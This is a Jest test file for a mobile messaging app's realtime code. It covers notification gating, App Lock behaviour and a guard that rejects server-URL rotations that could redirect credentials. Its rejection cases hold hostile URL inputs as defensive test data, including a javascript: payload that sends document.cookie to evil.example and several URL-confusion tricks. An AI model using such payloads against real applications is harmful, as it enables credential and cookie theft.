// `applyNewServerUrl` lives in realtimeControl, whose import graph pulls the whole realtime wiring
// (ky, op-sqlite, expo-file-system, notify-kit). Stub only the leaf modules with native/ESM deps so
// the function under test — and the real session store it mutates — stay REAL.
jest.mock('@core/api', () => ({ serverApi: { ping: jest.fn() } }));
jest.mock('@core/secure', () => ({
  logger: {
    debug: jest.fn(),
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  },
}));
jest.mock('@db/database', () => ({ getDatabase: jest.fn(), ensureDatabase: jest.fn() }));
jest.mock('@/services/clients', () => ({
  http: { buildHeaders: () => ({}), usesHeaderAuth: () => true },
  vault: { set: jest.fn(async () => {}), get: jest.fn(async () => null) },
}));
jest.mock('@/services/backgrounds/syncedBackground', () => ({ ensureSyncedBackground: jest.fn() }));
jest.mock('@/services/databaseControl', () => ({ ensureDatabase: jest.fn(async () => ({})) }));
jest.mock('@/services/syncControl', () => ({ maybeResumeSync: jest.fn() }));
jest.mock('@/services/download/autoDownloadAttachments', () => ({
  autoDownloadMessageAttachments: jest.fn(),
}));
jest.mock('@/services/reachability', () => ({ startReachabilityWatch: jest.fn() }));
jest.mock('@/services/notifications/notifeeService', () => ({
  postNotification: jest.fn(async () => {}),
  requestNotificationPermission: jest.fn(async () => {}),
}));

// Jest mocks must be registered before importing the realtime source graph.
/* eslint-disable import/first */
import { type EventSink, type NormalizedEvent } from '@core/realtime';
import { useFeatureSettingsStore } from '@state/featureSettingsStore';
import { useLockStore } from '@state/lockStore';
import { useSessionStore } from '@state/sessionStore';
import { ServerUrlEventSink } from '@/services/realtime/serverUrlEventSink';
import { DurableRealtimeDispatcher } from '@/services/realtime/incomingEventDispatcher';
import {
  captureRealtimeDeliveryLease,
  resumeRealtimeDeliveries,
} from '@/services/realtime/deliveryCoordinator';
import {
  applyNewServerUrl,
  dispatchRealtimeEvent,
  setSocket,
  shouldPresentMessageNotification,
} from '@/services/realtimeControl';
/* eslint-enable import/first */

const { vault: mockVault } = jest.requireMock('@/services/clients') as {
  vault: { set: jest.Mock };
};
const { ensureDatabase: mockEnsureDatabase } = jest.requireMock('@/services/databaseControl') as {
  ensureDatabase: jest.Mock;
};

const ev = (e: unknown): NormalizedEvent => e as NormalizedEvent;

describe('headless message-notification feature gate', () => {
  it.each([
    [{ hydrated: false, messageNotifications: true }, false],
    [{ hydrated: false, messageNotifications: false }, false],
    [{ hydrated: true, messageNotifications: false }, false],
    [{ hydrated: true, messageNotifications: true }, true],
  ] as const)('maps %p to %p', (settings, expected) => {
    expect(shouldPresentMessageNotification(settings)).toBe(expected);
  });

  it('enters durable intake before an unresolved feature-settings read', async () => {
    setSocket(null);
    resumeRealtimeDeliveries();
    useFeatureSettingsStore.setState({ hydrated: false });
    let releaseFeatures!: () => void;
    const featureHydrate = jest
      .spyOn(useFeatureSettingsStore.getState(), 'hydrate')
      .mockReturnValue(
        new Promise<void>((resolve) => {
          releaseFeatures = resolve;
        }),
      );
    const persist = jest
      .spyOn(DurableRealtimeDispatcher.prototype, 'handle')
      .mockResolvedValue(null);
    const lease = captureRealtimeDeliveryLease();

    try {
      await expect(
        dispatchRealtimeEvent('new-message', { guid: 'headless-pending' }, 'fcm', lease),
      ).resolves.toBeUndefined();

      // Hydration now belongs to the post-checkpoint notification phase, not pre-persistence.
      expect(featureHydrate).not.toHaveBeenCalled();
      expect(persist).toHaveBeenCalledWith(
        'new-message',
        expect.objectContaining({ guid: 'headless-pending' }),
        'fcm',
        expect.objectContaining({ generation: lease.generation }),
        undefined,
        expect.any(Number),
      );
      expect(shouldPresentMessageNotification(useFeatureSettingsStore.getState())).toBe(false);
    } finally {
      releaseFeatures?.();
      await Promise.resolve();
      setSocket(null);
      persist.mockRestore();
      featureHydrate.mockRestore();
      useFeatureSettingsStore.setState({ hydrated: true });
    }
  });

  it('does not open the database or admit a socket callback after App Lock engages', async () => {
    setSocket(null);
    resumeRealtimeDeliveries();
    useLockStore.setState({
      enabled: true,
      hydrated: true,
      locked: true,
      lastBackgrounded: null,
      timeoutMs: 30_000,
    });
    mockEnsureDatabase.mockClear();
    const persist = jest.spyOn(DurableRealtimeDispatcher.prototype, 'handle');
    const lease = captureRealtimeDeliveryLease();

    try {
      await expect(
        dispatchRealtimeEvent('new-message', { guid: 'arrived-after-lock' }, 'socket', lease),
      ).resolves.toBeUndefined();

      expect(mockEnsureDatabase).not.toHaveBeenCalled();
      expect(persist).not.toHaveBeenCalled();
    } finally {
      persist.mockRestore();
      useLockStore.setState({ enabled: false, hydrated: true, locked: false });
      setSocket(null);
    }
  });
});

describe('ServerUrlEventSink', () => {
  it('routes a new-server URL rotation to onNewUrl and short-circuits the inner sink', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(
      ev({ type: 'new-server', url: 'https://rotated.example.com' }),
      'socket',
    );
    expect(onNewUrl).toHaveBeenCalledWith('https://rotated.example.com');
    expect(inner.onEvent).not.toHaveBeenCalled();
  });

  it('delegates every other event to the inner sink untouched', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    const event = ev({ type: 'new-message', payload: {} });
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(event, 'fcm');
    expect(inner.onEvent).toHaveBeenCalledWith(event, 'fcm', undefined);
    expect(onNewUrl).not.toHaveBeenCalled();
  });

  it('propagates an inner-sink failure (does not swallow it)', async () => {
    const inner: EventSink = { onEvent: jest.fn().mockRejectedValue(new Error('db write failed')) };
    await expect(
      new ServerUrlEventSink(inner, jest.fn()).onEvent(
        ev({ type: 'new-message', payload: {} }),
        'socket',
      ),
    ).rejects.toThrow('db write failed');
  });
});

/**
 * The containment guard on the far side of the sink's `onNewUrl` callback.
 *
 * `new-server` is attacker-reachable: it arrives over FCM/socket and re-points BOTH the persisted
 * credential and every subsequent authenticated request (the password rides in the Authorization
 * header, so the origin decides who receives it). A valid https URL is not enough: a foreign host
 * or port is still a credential-exfiltration target and needs foreground approval.
 */
describe('applyNewServerUrl containment guard', () => {
  const ORIGINAL_ORIGIN = 'https://original.example.com';

  beforeEach(() => {
    useSessionStore.setState({ origin: ORIGINAL_ORIGIN, password: null });
    mockVault.set.mockClear();
  });

  it.each([
    'https://rotated.example.com',
    'https://original.example.com:8443',
    'http://original.example.com',
    'http://192.168.1.11:1234',
  ])('quarantines cross-origin or downgraded target %s', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it.each([
    'https://original.example.com',
    'https://original.example.com/',
    'HTTPS://ORIGINAL.EXAMPLE.COM:443',
  ])('treats the already-trusted canonical origin %s as a no-op', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it.each([
    'javascript:fetch("https://evil.example/"+document.cookie)',
    'file:///data/data/com.gator/files',
    'intent://evil.example/#Intent;scheme=https;end',
    'ws://evil.example',
    '//evil.example',
    'evil.example',
    'https://user:secret@original.example.com',
    'https://original.example.com/api',
    'https://original.example.com?next=https://evil.example',
    'https://original.example.com#fragment',
    'https://original.example.com\\@evil.example',
    'not a url at all',
    '',
  ])('rejects %p — origin unchanged and nothing persisted', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it('rejects even an otherwise valid origin with leading/trailing whitespace', async () => {
    await applyNewServerUrl('   https://original.example.com   ');
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });
});
